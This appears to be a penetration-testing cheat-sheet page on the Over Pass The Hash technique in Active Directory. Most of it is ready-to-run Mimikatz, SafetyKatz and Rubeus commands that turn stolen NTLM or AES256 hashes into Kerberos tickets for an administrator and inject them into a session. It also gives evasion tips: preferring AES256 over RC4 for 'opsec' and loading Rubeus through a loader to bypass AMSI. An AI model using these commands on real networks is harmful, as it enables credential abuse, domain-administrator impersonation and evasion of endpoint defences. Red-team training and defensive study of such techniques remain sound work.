# Over Pass The Hash

Over pass the hash (OPTH) is used between domain joined and not passing directly the NTLM hash to authenticate, instead asking for TGT.

{% hint style="warning" %}
Always try to avoid RC4 as it is not opsec friendly. Use AES256 where it is possible.
{% endhint %}

{% code fullWidth="false" %}
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

# Need Admin Privilege for OPTH
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys>  /run:cmd.exe" "exit"

#OPTH without Admin Privilege. Current session will be replaced
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt

# Need Admin Privilege
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

It's always safe way to load Rubeus through the Loader to bypass ASMI. Run with admin cmd.

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}
